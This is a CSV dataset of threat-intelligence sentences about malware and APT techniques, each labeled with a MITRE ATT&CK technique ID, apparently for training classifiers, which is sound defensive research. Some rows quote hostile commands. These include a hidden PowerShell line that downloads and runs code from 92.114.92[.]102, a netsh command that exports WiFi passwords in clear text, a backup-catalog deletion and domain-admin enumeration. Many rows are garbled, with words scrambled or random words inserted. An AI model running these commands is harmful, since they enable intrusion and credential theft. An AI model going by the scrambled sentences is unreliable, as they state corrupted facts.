text,labels
"avoirdupois Standard file systems include FAT, NTFS, ext4, and APFS.",T1564
Some MiniDuke components utilise chirrup to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.,T1102
BoomBox has used HTTP POST requests for C2.,T1071
VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher,T1059
Crutch has staged stolen files in the C:\AMD\Temp directory.,T1074
"OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.",T1555
"Adversaries may buy, steal, or download malware that comprise can be used during targeting.",T1588
Honeybee uses FTP for command and control.,T1071
"Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product",T1070
Adversaries may attempt to read screen captures of the desktop to gather information over the course of an operation.,T1113
"Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",T1070
One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=%APPDATA% They then gather more network information with a call to ipconfig and arp -a,T1016
APT29 has installed web shells on exploited Microsoft Exchange servers.,T1505
"On Windows Vista and newer, the hash format is DCC2  hash, also known as MS-Cache v2 hash.",T1003
PoetRAT has used a Python tool amp named Browdec.exe to steal browser credentials.,T1555
Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.,T1003
WIRTE has hold and used Empire for post-exploitation activities.,T1588
"The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.",T1027
"This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.",T1027
Benign commands or other operations may also be used delay malware execution.,T1497
"To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities",T1505
Linfo creates a backdoor through which remote attackers can obtain data from local systems.,T1005
Gorgon Group has obtained and used exploited tools such as QuasarRAT and Remcos.,T1588
RunningRAT kills antimalware running process.,T1562
Sibot has used a legitimate compromised website to download DLLs to the victims accept machine.,T1102
Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.,T1059
Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.,T1036
"When using the Create Account technique with a userID under 500  and enabling this property , an adversary can conceal user accounts.",T1564
OilRig has also tool named PICKPOCKET to dump passwords from web browsers.,T1555
"For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.",T1574
Proton captures the substance of the desktop with the screencapture binary.,T1113
can collect local files from the system .,T1005
"ZeroT gathers the victims computer name, Windows version, and system language, and then sends it to its C2 server.",T1082
"Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it.",T1021
CosmicDuke collects Windows account hashes.,T1003
ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.,T1033
Sandworm Team has run net use to connect to network shares.,T1021
"Dragonfly 2.victim shells created Web commonly on victims publicly accessible email and web servers, which they used to maintain access to a 0 network and download additional malicious files.",T1505
RATANKBA uses WMI to perform process monitoring.,T1047
"JPIN can obtain network information, including DNS, IP, and proxies.",T1016
"such WMI service enables both local and remote access, though the latter is facilitated by Remote Services The as Distributed Component Object Model  and Windows Remote Management .",T1047
Javali has achieved execution through victims clicking links to malicious websites.,T1204
creates a backdoor through which remote done attackers can steal system information.,T1005
Mapping of TG-3390s interactions researchers web shells during an intrusion responded to by CTU with,T1505
APT39 has used a screen capture utility to take screenshots on a compromised host.,T1113
Night Dragon has obtained and used tools such as arsenic gsecdump.,T1588
"Silence can create, delete, or tin modify a specified Registry key or value.",T1112
Webshell has the ability to copy files on a compromised Host.,T1005
"Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.",T1055
Lucifer can use WMI to log into remote machines propagation.,T1047
Dragonfly 2.0 modified the Registry to create user accounts.,T1564
Trojan.Karagany can create directories to store plugin output and stage data for.,T1074
"VNC is a platform-independent desktop sharing system that uses the RFB  protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.",T1021
Threat Group-3390 has locally archives encrypted staged for later exfiltration efforts.,T1074
POWRUNER may use WMI when accumulate information about a victim.,T1047
Kazuar has used internal nodes on the compromised network for C2 communications.,T1090
PoisonIvy stages collected data in a hoard text file.,T1074
register Bandook can collect local files from the system .,T1005
Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space,T1070
Andariel has collected large numbers of files from compromised network enceinte systems for later extraction.,T1005
"Microsoft Exchange ravish agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a incarnate signature to the end of all outstrip emails.",T1505
"The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString(hxxp://92.114.92[.]102:80/d);powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET",T1546
"Those infected systems may opt send the output from those commands back over a different C2 channel, including to another Web service.",T1102
HotCroissant has the ability to hide the window for operations performed on a given file.,T1564
Trojan.Karagany can gather information about the user on a compromised host.,T1033
PolyglotDuke can use steganography to hide C2 information in images.,T1027
Bazar can purpose a timer to delay execution of core functionality.,T1497
Stealth Falcon malware gathers system information Windows Management Instrumentation .,T1047
FIN6 used RDP to move laterally in victim networks.,T1021
GravityRAT creates a scheduled task to ensure it is re-executed everyday.,T1053
"If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible server and deploy ChinaChopper web scale",T1505
HotCroissant has the ability to identify the IP address of the compromised machine.,T1016
"APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.",T1588
"Rocke downloaded a file libprocesshider, which could hide files on the target system.",T1564
regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.    The script attempts to load the malicious module using regsvr with the run function.   Procmon shows the malicious module loaded to the Avast process,T1218
"SideTwist can usance GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.",T1106
Explosive has commonly placed file and path attributes to hidden.,T1564
PLEAD has to ability the proxy network communications.,T1090
Stealth information malware gathers system Falcon via Windows Management Instrumentation .,T1047
"Attack Lifecycle  Initial campaigns APT40 has been observed leveraging a variety of techniques for initial compromise, including custom server exploitation, phishing Compromise delivering publicly available and web backdoors, and strategic web compromises",T1505
Frankenstein has obtained and used Empire to deploy agents.,T1588
FLASHFLOOD searches for interesting files  on the local system and removable media.,T1083
ROKRAT steals credentials by leveraging the Windows Vault mechanism.,T1555
APT32 has collected the OS version and computer name from victims.,T1082
ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.,T1016
Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.,T1574
EvilBunnys dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is duration in a sandbox environment.,T1497
"TEMP.Veles has used a publicly-available PowerShell-based tool, WMImplant.",T1059
"Gorgon Group malware can leverage the Windows API call, CreateProcessA, for execution.",T1106
TEMP.Veles has planted WWW shells on Outlook Exchange servers.,T1505
WindTail has the ability to enumerate the users home directory and the path to its own application bundle.,T1083
PLAINTEE uses reg to add a Registry Run key for persistence.,T1112
Adversaries may attempt to get a listing produce of domain accounts.,T1087
Cobalt Strike can track key presses with a keylogger module.,T1056
BabyShark has used mshta.exe to download and execute applications from a remote server.,T1218
steal can Chaes login credentials and stored financial information from the browser.,T1555
Adversaries may encode data with a non-standard data encoding system to name the content of command and ascendency traffic more difficult to detect.,T1132
Dragonfly 2.0 modified the Registry to perform multiple techniques Reg the use of through.,T1112
An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries.,T1560
Calisto uses a hidden directory named .calisto to store data exfiltration the victim’s machine before from.,T1074
KONNI can collect the username from the victim’s machine.,T1033
Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.,T1218
The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase,T1082
Chaes stored its instructions a config file in the Registry.,T1112
"WMI can be access using a variety of prick, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",T1047
"Adversaries may using this do a Command and Scripting Interpreter, such as cmd, which has functionality to interact with the file system to gather information.",T1005
uses Microsoft OneDrive as a C2 server via a network drive mapped with net use.,T1102
Wizard Spider has identified domain admins through the use of “net group ‘Domain admins’” hotshot commands.,T1087
FIN7 has used malicious links to lure victims into downloading malware.,T1204
Caterpillar WebShell info has a module to collect information from the local database.,T1005
Molerats has used forged Microsoft code-signing certificates on malware.,T1553
leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI),T1047
BackConfig Windows the ability to set folders or files to be hidden from the has Explorer default view.,T1564
Kimsuky has obtained and used tools such as Mimikatz and PsExec.,T1588
creates a Registry subkey that registers a new system device.,T1112
Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.,T1505
SUNBURST used Base64 in its C2 traffic.,T1132
Bazar downloads have been hosted on Google Docs.,T1102
"To report an intrusion and request resources for incident response or technical assistance, you are encouraged promote to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), advance the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other bonk attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems fire for known web application vulnerabilities",T1505
The Deep Panda group is known to WMI for lateral movement.,T1047
The presence of the com.apple.quarantine quarantine flag can be checked with the xattr command xattr -l /path/to/examplefile.,T1553
"WastedLockers custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.",T1140
jRAT has the capability to take screenshots of the victim’s machine.,T1113
"Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor.",T1588
Bazar can execute a PowerShell script received from C2.,T1059
NavRAT writes multiple outputs to a TMP file apply the >> method.,T1074
Indrik Spider has stored collected file in a .tmp date.,T1074
NETWIRE has web services including Paste.ee to host payloads.,T1102
RDAT can issue SOAP requests to delete already processed C2 emails.,T1070
Metamorfo has a zip file for execution on the system.,T1102
The OsInfo function in Komplex collects a running process list.,T1057
Wiarp creates a backdoor through which remote attackers can create a service.,T1543
Avaddon modifies various registry keys for persistence and UAC bypass.,T1112
has collected various files from the compromised computers.,T1005
Cobian RAT obfuscates communications with the server C2 using Base64 encoding.,T1132
"Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.",T1016
UNC2452 used account credentials they obtained to attempt to Group Managed Service Account  passwords.,T1555
TA505 has used spearphishing emails with malicious attachments to initially compromise victims.,T1566
Final1stspy obtains victim Microsoft Windows version information and CPU architecture.,T1082
Patchwork attempted to use RDP to move laterally.,T1021
APT39 has used WinRAR and 7-Zip to compress an archive stolen data.,T1560
Dyre can detect sandbox environments by inspecting the process list and Registry.,T1497
Launch Agents can also be executed using the Launchctl command.,T1543
SOUNDBITE the capable of modifying is Registry.,T1112
DarkComet can use HTTP for C2 communications.,T1071
"RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation",T1016
GoldenSpy can execute remote commands in the Windows command shell using WinExec API.,T1106
4H RAT has the capability to obtain a listing of running processes .,T1057
IcedID has used WMI binaries execute to.,T1047
BLINDINGCAN has used HTTPS over port 443 for command and control.,T1071
FALLCHILL encrypts C2 data with RC4 encryption.,T1573
Pillowmint has used a PowerShell script to install a shim database.,T1059
XTunnel relay traffic between a C2 server and a victim.,T1090
"Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\system32), the encrypted backdoor is located in a different directory (%Program Files%\Common Files\System\ado)",T1027
"InvisiMole has a command to create, set, copy, or delete a specified Registry cardinal or value.",T1112
"Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services",T1505
Ursnif has used a peer-to-peer  web for C2.,T1090
Bisonal deletes its dropper and VBS scripts from the victim’s machine.,T1070
HotCroissant has the ability to list running processes on the infected host.,T1057
"Dragonfly 2.0 commonly created Web shells on victims to and email accessible web servers, which they used publicly maintain access to a victim network and download additional malicious files.",T1505
Execution granted through EWM injection may allow access to both the target processs memory and possibly elevated privileges.,T1055
PROMETHIUM has receive signed code with self-signed certificates.,T1553
"Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4",T1071
"To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters",T1082
down_new has the ability to gather information on installed applications.,T1518
"Adversaries may also check the network adapters addresses, resister CPU core count, and available memory/drive size.",T1497
KeyBoy installs a service pointing to a malicious DLL dropped to disk.,T1543
Volgmer executes payloads using the Windows API call CreateProcessW.,T1106
"APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.",T1218
Chimera has used direct Windows system calls by leveraging Dumpert.,T1106
KONNI can delete files.,T1070
Third-party security software such as endpoint detection and response  tools may not start after booting Windows in safe mode.,T1562
Agent Tesla can add itself to the Registry as a startup program to establish persistence.,T1547
QakBot can store its configuration information in a randomly subkey under HKCU\Software\Microsoft.,T1112
BlackMould has the ability to find files on the targeted system.,T1083
Another variant decodes the embedded file by XORing it with the value 0x35.,T1140
Bankshot publish data into the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj.,T1112
PoetRAT has urinate registry modifications to alter its behavior upon execution.,T1112
APT39 has modified and used customized versions of publicly-available tools like PLINK Mimikatz.,T1588
Denis can launch a remote shell to execute arbitrary commands on the victim’s machine.,T1059
HOPLIGHT has the capability to harvest credentials and passwords from the SAM database.,T1003
Exaramel for Windows automatically encrypts files before sending them to the C2 server.,T1560
Taidoor a upload data and files from can victims machine.,T1005
PUNCHBUGGY can gather user exploiter names.,T1087
ZxShell is injected into a shared SVCHOST process.,T1055
Lurid can compress data before earlier sending it.,T1560
Adversaries may attempt to get information about running processes on a system.,T1057
"In addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.",T1003
ComRAT has used HTTP requests for command and control.,T1071
POWERSTATS has connected to servers through proxies.,T1090
"The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.",T1218
"InvisiMole has a command to create, set, copy, or delete a specified Registry key or.",T1112
System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.,T1082
APT18 actors deleted tools and batch files from victim systems.,T1070
"Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces , or from individuals.",T1588
"Data is compressed with zlib, and bytes are rotated iv times before being XORed with 0x23.",T1560
Threat Group-3390 has used net user to conduct internal discovery of systems.,T1087
A Web shell is admit a Web script that is placed approachable on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.,T1505
"OilRig has run net user, net user /domain, net group “domain admins” /get, and net group “Exchange Trusted Subsystem” /domain to domain account listings on a victim.",T1087
creates a backdoor through which remote attackers can steal organisation information.,T1005
"Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection.",T1059
Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.,T1566
TEMP.Veles has get and used tools such as Mimikatz and PsExec.,T1588
"receive can the with its operators by exploiting the Simplenote, DropBox, and communicate social media platform, Facebook, where it can create fake accounts to control the backdoor and DropBook instructions.",T1102
Adversaries may employ various system checks to detect psychoanalysis and avoid virtualization and analysis environments.,T1497
"Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",T1083
Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.,T1036
"Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO",T1546
UNC2452 used account credential they obtained to attempt access to Group Managed Service Account  passwords.,T1555
"Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload",T1566
Legitimate applications  and other administrative programs may utilize Remote Services to access remote hosts.,T1021
APT12 has used blogs and secondhand WordPress for C2 infrastructure.,T1102
xCaon has uploaded files automobile from victims machines.,T1005
"Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.",T1560
to has used the WMI command-line  utility StoneDrill run tasks.,T1047
EvilBunny has executed C2 commands directly via HTTP.,T1071
The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. ,T1518
Carbanak has a command to delete files.,T1070
Kimsuky has used attempted to lure victims into opening malicious e-mail attachments.,T1204
SpeakUp encodes its second-stage payload with Base64.,T1027
The shellcode performs a system survey to collect the victims computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.,T1033
Emissary is capable of configuring itself as service.,T1543
Trojan.Karagany can communicate with C2 via HTTP POST requests.,T1071
"FALLCHILL can collect operating system  version information, processor information, system name, and information about installed disks from the victim.",T1082
"Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.",T1102
Adversaries may abuse SQL stored establish to procedures persistent access to systems.,T1505
ShadowPad has downloaded code from a C2 server.,T1105
Patchwork exfiltrated and collected files from the infected system.,T1005
Leviathan has archived victims data prior to exfiltration.,T1560
Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials.,T1003
ObliqueRAT can hide its payload in BMP images hosted on compromised websites.,T1027
Command and control  information can be encoded using a standard data encoding system.,T1132
FIN8s malicious spearphishing payloads use WMI to launch malware and spawn.exe execution.,T1047
An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method.,T1560
"After the elapsed meter, XCSSET executes additional modules.",T1497
Adversaries may utilise various time-based methods to detect and avoid virtualization and analysis environments.,T1497
SUNBURST was signed by SolarWinds from March - May 2020.,T1553
Agent Tesla can achieve persistence by modifying Registry key entries.,T1112
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.,T1546
BoxCaon can download files.,T1105
"Gamaredon Group has embedded malicious macros in document templates, which executed VBScript.",T1059
"Silence can create, delete, or modify a specified Registry key or value.",T1112
Astaroth checks for the presence of Avast antivirus in the C:\Program\Files\ folder.,T1518
BS2005 uses Base64 encoding for communication in the message body of an HTTP request.,T1132
Avaddon and several registry keys for persistence modifies UAC bypass.,T1112
Turla net use commands to connect to lateral systems within a network.,T1021
"KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.",T1082
"Google In Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook  service.",T1087
The adversary can then send malicious links or attachments through these services.,T1566
Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states,T1083
Metamorfo has encrypted payloads and strings.,T1027
FYAnti has the ability to decrypt an embedded .NET module.,T1140
Chaes stored its pedagogy in a config file in the Registry.,T1112
BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.,T1036
WastedLocker checked if UCOMIEnumConnections and Registry IActiveScriptParseProcedure32 keys were detected as part of its anti-analysis technique.,T1497
"BACKSPACE will attempt to establish a C2, will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow connection to proceed.",T1562
Machete created their own directories to drop files into.,T1074
RTM can capture screenshots.,T1113
The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string,T1140
SpeakUp deletes files to remove evidence on the machine.,T1070
Aria-body has the ability to capture screenshots on compromised hosts.,T1113
RogueRobin has used Google Drive as a Command and Control channel.,T1102
WIRTE has obtained and practice Empire for post-exploitation activities.,T1588
"APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.",T1588
"For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system  Inhibit System Recovery without prompts to the user .",T1218
Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come,T1102
menuPass has been seen changing malicious files to appear legitimate.,T1036
NavRAT writes multiple outputs to a TMP file turnout using the >> method.,T1074
Adversaries may add login items to execute upon user login to gain persistence or escalate privileges.,T1547
Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment.,T1497
DustySky checks for the existence of anti-virus.,T1518
They previously used named and hijacked scheduled tasks to also establish persistence.,T1053
Operation Wocao has exfiltrated files and directories of from interest the targeted system.,T1005
ShimRat has registered two registry tonality for shim databases.,T1112
Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.,T1574
VERMIN uses WMI check to for anti-virus software installed on the system.,T1518
"Orangeworm has copied its backdoor across ADMIN network shares, including open$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.",T1021
"Lazarus Group malware before copies specified directories from the victims machine, then archives and encrypts the directories RomeoDelta uploading to its C2 server.",T1005
"* **Inline hooking**, which overwrites first bytes in an API function to redirect code flow.",T1056
MegaCortex used code signing certificates issued to fake companies to bypass security controls.,T1588
Variants of Emissary have added Run Registry keys to establish persistence.,T1547
Ryuk can create .dll files that actually contain a Rich Text File format document.,T1036
BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.,T1574
Elise exfiltrates data practice cookie values that are Base64-encoded.,T1132
PLEAD has been executed via malicious links in e-mails.,T1204
Webshell maintain access to victim networks.,T1505
Kimsuky has gathered information about the infected computer.,T1082
Fox Kitten has searched local system resources to access sensitive documents.,T1005
SOUNDBITE is capable of gathering system information.,T1082
Pay2Key can remove its log file from disk.,T1070
a stages collected data in PoisonIvy text file.,T1074
"PoetRAT used voStro.exe, a compiled pypykatz , to steal credentials.",T1003
TeamTNT has also used a custom user agent HTTP header in shell scripts.,T1071
Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.,T1055
"UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu package on the compromised machine.",T1497
The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample..jpg (renamed: Windows-KB271854-x86.exe) is a sample.PoohMilk AnalysisThe PoohMilk is designed perform two actions:Create persistence to the Freenki sample at the next reboot.Check files on the infected machine.The first action is to create a registry key in order to execute the.exe file previously downloaded,T1106
Adversaries may target LSASS drivers to obtain persistence.,T1547
Andariel has used a variety of publicly-available remote access Trojans  for its ampere operations.,T1588
"PowerDuke has commands to get information about the victims name, build, version, serial number, and memory usage.",T1082
Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain.,T1112
Trojan.Karagany can create directories data store plugin output and stage to for exfiltration.,T1074
Molerats has created scheduled tasks to persistently run VBScripts.,T1053
FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.,T1204
These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line.,T1564
"“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function",T1057
ABK has the ability to use cmd to run a Portable Executable  on the compromised host.,T1059
"Upon opening the attachment , the adversarys payload exploits a vulnerability or directly executes on the users system.",T1566
NETWIRE has used web services including Paste.ee to host payloads.,T1102
"PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.",T1112
Many of this APT’s components are signed with phony Intel and AMD digital certificates,T1553
Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable,T1105
"When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder",T1547
ROKRAT steals credentials stored in Web browsers by querying the sqlite database.,T1555
Machete captures.,T1113
Sibot will delete an associated registry key if a certain server response is received.,T1070
Root certificates  can reinstalled be cloned and also.,T1553
TeamTNT has established persistence through the creation of a cryptocurrency mining system service.,T1543
FlawedAmmyy anti-virus attempt to detect will products during the initial infection.,T1518
can RC4-encrypt credentials before sending to the C2.,T1560
CosmicDuke steals user files from local hard drives with file extensions that match predefined list.,T1005
repeatedly has used malware that Darkhotel checks the mouse cursor position to determine if a real user is on the system.,T1497
APT19 uses a 22 malware variant to modify several Registry keys.,T1112
"<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command",T1573
Those infected systems can then charge the output from those commands back over that Web service channel.,T1102
Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.,T1204
GALLIUM has used stolen certificates to sign its putz including those from Whizzimo LLC.,T1553
Helminth creates folders to store output from batch scripts prior to sending the information to its C2 clutch server.,T1074
Kimsuky has been observed turning off Windows Security Center.,T1562
Calisto has the capability to upload and download files to the victims machine.,T1105
Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.,T1090
The ASPXTool version used by Threat Group-3390 has net been deployed to accessible servers running Internet Information Services .,T1505
The QakBot payload has been disguised as a PNG file.,T1036
